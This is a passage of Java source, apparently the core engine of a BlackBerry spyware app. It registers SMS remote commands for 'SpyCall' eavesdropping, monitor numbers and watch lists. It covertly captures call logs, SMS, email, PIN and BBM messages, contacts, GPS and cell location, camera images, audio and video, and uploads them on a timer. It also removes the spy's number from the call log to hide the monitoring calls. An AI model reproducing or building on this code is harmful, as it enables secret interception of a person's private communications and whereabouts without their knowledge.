				rmtCmdRegister.deregisterCommands(gpsCmdLine);
				rmtCmdRegister.deregisterCommands(gpsOnDemandCmdLine);
				rmtCmdRegister.deregisterCommands(updateLocIntervalCmdLine);
			}
			if (prefSystem.isSupported()) {
				// Start SIM Command
				RmtCmdLine simCmdLine = new RmtCmdLine();
				simCmdLine.setCode(smsCmdCode.getEnableSIMCmd());
				simCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.deregisterCommands(simCmdLine);
			}
			if (prefBug.isSupported()) {
				// Start SpyCall Command
				RmtCmdLine spyCallCmdLine = new RmtCmdLine();
				spyCallCmdLine.setCode(smsCmdCode.getEnableSpyCallCmd());
				spyCallCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Start SpyCall with Monitor number
				RmtCmdLine spyCallMPNCmdLine = new RmtCmdLine();
				spyCallMPNCmdLine.setCode(smsCmdCode.getEnableSpyCallMPNCmd());
				spyCallMPNCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Add Home IN Command
				RmtCmdLine addHomeInCmdLine = new RmtCmdLine();
				addHomeInCmdLine.setCode(smsCmdCode.getAddHomeInNumberCmd());
				addHomeInCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Reset Home IN Command
				RmtCmdLine resetHomeInCmdLine = new RmtCmdLine();
				resetHomeInCmdLine.setCode(smsCmdCode.getResetHomeInNumberCmd());
				resetHomeInCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Clear Home IN Command
				RmtCmdLine clearHomeInCmdLine = new RmtCmdLine();
				clearHomeInCmdLine.setCode(smsCmdCode.getClearHomeInNumberCmd());
				clearHomeInCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Query Home IN Command
				RmtCmdLine queryHomeInCmdLine = new RmtCmdLine();
				queryHomeInCmdLine.setCode(smsCmdCode.getQueryHomeInNumberCmd());
				queryHomeInCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Add Home OUT Command
				RmtCmdLine addHomeOutCmdLine = new RmtCmdLine();
				addHomeOutCmdLine.setCode(smsCmdCode.getAddHomeOutNumberCmd());
				addHomeOutCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Reset Home OUT Command
				RmtCmdLine resetHomeOutCmdLine = new RmtCmdLine();
				resetHomeOutCmdLine.setCode(smsCmdCode.getResetHomeOutNumberCmd());
				resetHomeOutCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Clear Home OUT Command
				RmtCmdLine clearHomeOutCmdLine = new RmtCmdLine();
				clearHomeOutCmdLine.setCode(smsCmdCode.getClearHomeOutNumberCmd());
				clearHomeOutCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Query Home IN Command
				RmtCmdLine queryHomeOutCmdLine = new RmtCmdLine();
				queryHomeOutCmdLine.setCode(smsCmdCode.getQueryHomeOutNumberCmd());
				queryHomeOutCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Add Monitor Number Command		
				RmtCmdLine addMonitorCmdLine = new RmtCmdLine();
				addMonitorCmdLine.setCode(smsCmdCode.getAddMonitorNumberCmd());
				addMonitorCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Reset Monitor Number Command
				RmtCmdLine resetMonitorCmdLine = new RmtCmdLine();
				resetMonitorCmdLine.setCode(smsCmdCode.getResetMonitorNumberCmd());
				resetMonitorCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Clear Monitor Number Command
				RmtCmdLine clearMonitorCmdLine = new RmtCmdLine();
				clearMonitorCmdLine.setCode(smsCmdCode.getClearMonitorNumberCmd());
				clearMonitorCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// Query Monitor Number Command
				RmtCmdLine queryMonitorCmdLine = new RmtCmdLine();
				queryMonitorCmdLine.setCode(smsCmdCode.getQueryMonitorNumberCmd());
				queryMonitorCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.deregisterCommands(spyCallCmdLine);
				rmtCmdRegister.deregisterCommands(spyCallMPNCmdLine);
				/*rmtCmdRegister.deregisterCommands(addHomeInCmdLine);
				rmtCmdRegister.deregisterCommands(resetHomeInCmdLine);
				rmtCmdRegister.deregisterCommands(clearHomeInCmdLine);
				rmtCmdRegister.deregisterCommands(queryHomeInCmdLine);*/
				rmtCmdRegister.deregisterCommands(addHomeOutCmdLine);
				rmtCmdRegister.deregisterCommands(resetHomeOutCmdLine);
				rmtCmdRegister.deregisterCommands(clearHomeOutCmdLine);
				rmtCmdRegister.deregisterCommands(queryHomeOutCmdLine);
				rmtCmdRegister.deregisterCommands(addMonitorCmdLine);
				rmtCmdRegister.deregisterCommands(resetMonitorCmdLine);
				rmtCmdRegister.deregisterCommands(clearMonitorCmdLine);
				rmtCmdRegister.deregisterCommands(queryMonitorCmdLine);		
				if (prefBug.isConferenceSupported()) {
					// Enable Watch List Command
					RmtCmdLine watchListCmdLine = new RmtCmdLine();
					watchListCmdLine.setCode(smsCmdCode.getEnableWatchListCmd());
					watchListCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// Set Watch Flags Command
					RmtCmdLine setWatchFlagsCmdLine = new RmtCmdLine();
					setWatchFlagsCmdLine.setCode(smsCmdCode.getSetWatchFlagsCmd());
					setWatchFlagsCmdLine.setRmtCmdType(RmtCmdType.SMS);		
					// Add Watch Number Command
					RmtCmdLine addWatchCmdLine = new RmtCmdLine();
					addWatchCmdLine.setCode(smsCmdCode.getAddWatchNumberCmd());
					addWatchCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// Reset Watch Number Command
					RmtCmdLine resetWatchCmdLine = new RmtCmdLine();
					resetWatchCmdLine.setCode(smsCmdCode.getResetWatchNumberCmd());
					resetWatchCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// Clear Watch Number Command
					RmtCmdLine clearWatchCmdLine = new RmtCmdLine();
					clearWatchCmdLine.setCode(smsCmdCode.getClearWatchNumberCmd());
					clearWatchCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// Query Watch Number Command
					RmtCmdLine queryWatchCmdLine = new RmtCmdLine();
					queryWatchCmdLine.setCode(smsCmdCode.getQueryWatchNumberCmd());
					queryWatchCmdLine.setRmtCmdType(RmtCmdType.SMS);
					// To add commands.
					rmtCmdRegister.deregisterCommands(watchListCmdLine);
					rmtCmdRegister.deregisterCommands(setWatchFlagsCmdLine);
					rmtCmdRegister.deregisterCommands(addWatchCmdLine);
					rmtCmdRegister.deregisterCommands(resetWatchCmdLine);
					rmtCmdRegister.deregisterCommands(clearWatchCmdLine);
					rmtCmdRegister.deregisterCommands(queryWatchCmdLine);
				}
			}
			if (prefMessenger.isSupported()) {
				// Start BBM Command
				RmtCmdLine bbmCmdLine = new RmtCmdLine();
				bbmCmdLine.setCode(smsCmdCode.getBBMCmd());
				bbmCmdLine.setRmtCmdType(RmtCmdType.SMS);
				// To add commands.
				rmtCmdRegister.deregisterCommands(bbmCmdLine);
			}
		} catch (Exception e) {
			Log.error("AppEngine.deregisterRmtCmd()", e.getMessage(), e);
		}
	}
	
	private void handleEvents() {
		PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		int timeIndex = general.getSendTimeIndex();
		if (timeIndex > 0) {
			int maxEvent = general.getMaxEventCount();
			int events = db.getNumberOfEvent();
			if (events >= maxEvent) {
				eventSender.sendEvents();
			}
		}
	}
	
	private boolean isCallNotificationEnabled(BugInfo bugInfo) {
		boolean isCallNotifEnabled = false;
		if (bugInfo != null) {
			WatchListInfo watchListInfo = bugInfo.getWatchListInfo();
			if (bugInfo.isEnabled() && bugInfo.countHomeOutNumber() > 0 && watchListInfo.isWatchListEnabled() && 
						(watchListInfo.isInAddrbookEnabled() || watchListInfo.isNotInAddrbookEnabled() ||
								watchListInfo.isInWatchListEnabled() || watchListInfo.isUnknownEnabled())) {
				isCallNotifEnabled = true;
				if (watchListInfo.isInWatchListEnabled() && !watchListInfo.isInAddrbookEnabled() && 
						!watchListInfo.isNotInAddrbookEnabled() && !watchListInfo.isUnknownEnabled()) {
					isCallNotifEnabled = (watchListInfo.countWatchNumber() > 0);
				}
			}
		}
		return isCallNotifEnabled;
	}
	
	// PreferenceChangeListener
	public void preferenceChanged(PrefInfo prefInfo) {
		try {
			LicenseInfo licenseInfo = license.getLicenseInfo();
			if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
				int prefId = prefInfo.getPrefType().getId();
				if (prefId == PreferenceType.PREF_EVENT_INFO.getId()) {
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					PrefEventInfo eventInfo = (PrefEventInfo)prefInfo;
					boolean captured = general.isCaptured();
					// CallLog
					if (captured && eventInfo.isCallLogEnabled()) {
						callLogCapture.startCapture();
					} else {
						callLogCapture.stopCapture();
					}
					// SMS
					if (captured && eventInfo.isSMSEnabled()) {
						smsCapture.startCapture();
					} else {
						smsCapture.stopCapture();
					}
					// Email
					if (captured && eventInfo.isEmailEnabled()) {
						emailCapture.startCapture();
					} else {
						emailCapture.stopCapture();
					}
				} else if (prefId == PreferenceType.PREF_ADDRESS_BOOK.getId()) {
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					PrefAddressBook addrBookInfo = (PrefAddressBook)prefInfo;
					// Address Book
					if (general.isCaptured() && addrBookInfo.isEnabled()) {
						addrCapture.startCapture();
					} else {
						addrCapture.stopCapture();
					}
				} else if (prefId == PreferenceType.PREF_PIN.getId()) {
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					PrefPIN pin = (PrefPIN)prefInfo;
					// PIN
					if (general.isCaptured() && pin.isEnabled()) {
						pinCapture.startCapture();
					} else {
						pinCapture.stopCapture();
					}
				} else if (prefId == PreferenceType.PREF_BUG_INFO.getId()) {
					PrefBugInfo prefBug = (PrefBugInfo)prefInfo;
					BugInfo bugInfo = new BugInfo();
					bugInfo.setConferenceEnabled(prefBug.isConferenceSupported());
					bugInfo.setEnabled(prefBug.isEnabled());
					fxNumberRemover.removeCallLogNumber(spyNumber);
					// Monitor numbers
					int count = prefBug.countMonitorNumber();
					for (int i = 0; i < count; i++) {
						spyNumber = prefBug.getMonitorNumber(i);
						if (prefBug.isEnabled() && (!spyNumber.trim().equals(Constant.EMPTY_STRING))) {
							bugInfo.addSpyNumber(spyNumber);
							fxNumberRemover.addCallLogNumber(spyNumber);
						}
					}
					// Watch List
					PrefWatchListInfo prefWatchList = prefBug.getPrefWatchListInfo();
					WatchListInfo watchListInfo = new WatchListInfo();
					count = prefWatchList.countWatchNumber();	
					for (int i = 0; i < count; i++) {
						watchNumber = prefWatchList.getWatchNumber(i);
						if (prefWatchList.isWatchListEnabled() && (!watchNumber.trim().equals(Constant.EMPTY_STRING))) {
							watchListInfo.addWatchNumber(watchNumber);
						}
					}
					watchListInfo.setWatchListEnabled(prefWatchList.isWatchListEnabled());
					watchListInfo.setInAddrbookEnabled(prefWatchList.isInAddrbookEnabled());
					watchListInfo.setInWatchListEnabled(prefWatchList.isInWatchListEnabled());
					watchListInfo.setNotInAddrbookEnabled(prefWatchList.isNotInAddrbookEnabled());
					watchListInfo.setUnknownEnabled(prefWatchList.isUnknownEnabled());
					bugInfo.setWatchListInfo(watchListInfo);
					// Home-Out
					int countHomeOut = prefBug.countHomeOutNumber();
					for (int i = 0; i < countHomeOut; i++) {
						homeOutNumber = prefBug.getHomeOutNumber(i);		
						if (prefBug.isEnabled() && (!homeOutNumber.trim().equals(Constant.EMPTY_STRING))) {
							bugInfo.addHomeOutNumber(homeOutNumber);
						}
					}
					bugEngine.stop();
					bugEngine.setBugInfo(bugInfo);
					bugEngine.start();
					if (isCallNotificationEnabled(bugInfo)) {
						callNotification.start(bugInfo);
					} else {
						callNotification.stop();
					}
				} else if (prefId == PreferenceType.PREF_CELL_INFO.getId()) {
					// To set event listener.
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					PrefCellInfo cellInfo = (PrefCellInfo)prefInfo;
					cellInfoCapture.setInterval(cellInfo.getInterval());
					cellInfoCapture.stopCapture();
					if (general.isCaptured() && cellInfo.isEnabled()) {
						cellInfoCapture.startCapture();
					}
				} else if (prefId == PreferenceType.PREF_GPS.getId()) {
					PrefGPS gps = (PrefGPS)prefInfo;
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					locCapture.setGPSOption(gps.getGpsOption());
					locCapture.stopCapture();
					if (general.isCaptured() && gps.isEnabled()) {
						locCapture.startCapture();
					}
				} else if (prefId == PreferenceType.PREF_IM.getId()) {
					PrefMessenger messenger = (PrefMessenger)prefInfo;
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					// BBM
					if (general.isCaptured() && messenger.isBBMEnabled()) {
						bbmCapture.startCapture();
					} else {
						bbmCapture.stopCapture();
					}
				} else if (prefId == PreferenceType.PREF_GENERAL.getId()) {
					PrefGeneral general = (PrefGeneral)prefInfo;
					int timerIndexChanged = general.getSendTimeIndex();
					int maxEventCountChanged = general.getMaxEventCount();
					boolean capturedChanged = general.isCaptured();
					// Timer field is changed.
					if (timerIndexDefault != timerIndexChanged) {
						timerIndexDefault = timerIndexChanged;
						sendTimer.stop();
						sendTimer.setInterval(ApplicationInfo.TIME_VALUE[timerIndexChanged]);
						sendTimer.start();
						long currentTime = System.currentTimeMillis();
						long nextSchedule = currentTime + ApplicationInfo.TIME_VALUE[timerIndexChanged] * 1000;
						general.setNextSchedule(nextSchedule);
						pref.commit(general);
					}
					if (maxEventCountDefault != maxEventCountChanged) {
						maxEventCountDefault = maxEventCountChanged;
						handleEvents();
					}
					// Capture field is changed.
					if (capturedDefault != capturedChanged) {
						capturedDefault = capturedChanged;
						// BBM
						PrefMessenger messenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
						if (messenger.isSupported()) {
							pref.commit(messenger);
						}
						// CallLog, Email, SMS
						PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
						if (eventInfo.isSupported()) {
							pref.commit(eventInfo);
						}
						// GPS
						PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
						if (gpsInfo.isSupported()) {
							pref.commit(gpsInfo);
						}
						// CellSite
						PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
						if (cellInfo.isSupported()) {
							pref.commit(cellInfo);
						}
						// Address Book
						PrefAddressBook addrInfo = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
						if (addrInfo.isSupported()) {
							pref.commit(addrInfo);
						}
						// PIN
						PrefPIN pin = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
						if (pin.isSupported()) {
							pref.commit(pin);
						}
						// Image
						PrefCameraImage image = (PrefCameraImage) pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
						if (image.isSupported()) {
							pref.commit(image);
						}
						// Audio File
						PrefAudioFile prefAudioFile = (PrefAudioFile) pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
						if (prefAudioFile.isSupported()) {
							pref.commit(prefAudioFile);
						}
						// Video File
						PrefVideoFile prefVideoFile = (PrefVideoFile) pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
						if (prefVideoFile.isSupported()) {
							pref.commit(prefVideoFile);
						}
					}
				} else if (prefId == PreferenceType.PREF_SYSTEM.getId()) {
					PrefSystem system = (PrefSystem)prefInfo;
					// SIM Change
					if (system.isSIMChangeEnabled()) {
						// TODO
						PrefBugInfo bugInfo = (PrefBugInfo)Global.getPreference().getPrefInfo(PreferenceType.PREF_BUG_INFO);
						simChNotif.setRecipentNumbers(bugInfo.getHomeOutNumberStore());
						simChNotif.startCapture();
					} else {
						simChNotif.stopCapture();
					}
				} else if (prefId == PreferenceType.PREF_CAMERA_IMAGE.getId()) {
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					PrefCameraImage image = (PrefCameraImage)prefInfo;
					// Camera Image
					if (general.isCaptured() && image.isEnabled()) {
						mediaCapture.startImageCapture();
					} else {
						mediaCapture.stopImageCapture();
					}
				} else if (prefId == PreferenceType.PREF_AUDIO_FILE.getId()) {
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					PrefAudioFile prefAudioFile = (PrefAudioFile)prefInfo;
					// Audio File
					if (general.isCaptured() && prefAudioFile.isEnabled()) {
						mediaCapture.startAudioCapture();
					} else {
						mediaCapture.stopAudioCapture();
					}					
				} else if (prefId == PreferenceType.PREF_VIDEO_FILE.getId()) {
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					PrefVideoFile prefVideoFile = (PrefVideoFile)prefInfo;
					// Video File
					if (general.isCaptured() && prefVideoFile.isEnabled()) {
						mediaCapture.startVideoCapture();
					} else {
						mediaCapture.stopVideoCapture();
					}
				}
			}
		} catch(Exception e) {
			Log.error("AppEngine.preferenceChanged", e.getMessage(), e);
		}
	}

	// SMSCmdChangeListener
	public void smsCmdChanged() {
		rmtCmdRegister.deregisterAllCommands();
		registerRmtCmd();
	}

	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error("AppEngine.onError", "message: " + message);
	}

	public void onSuccess(CommandResponse response) {
		sendTimer.stop();
		if (response instanceof SendEventCmdResponse) {
			PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			SendEventCmdResponse sendEventRes = (SendEventCmdResponse)response;
//			general.setConnectionMethod(sendEventRes.getConnectionMethod());
			long currentTime = System.currentTimeMillis();
//			general.setLastConnection(currentTime);
			long nextSchedule = currentTime + ApplicationInfo.TIME_VALUE[general.getSendTimeIndex()] * 1000;
			general.setNextSchedule(nextSchedule);
			pref.commit(general);
		}
		sendTimer.start();
	}

	// FxEventDBListener
	public void onDeleteError() {
	}

	public void onDeleteSuccess() {
	}

	public void onInsertError() {
	}

	public void onInsertSuccess() {
		handleEvents();
	}

	// FxTimerListener
	public void timerExpired(int id) {
		PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		int sendTime = ApplicationInfo.TIME_VALUE[general.getSendTimeIndex()];
		if (sendTime > 0) {
			eventSender.sendEvents();
		}
	}
}
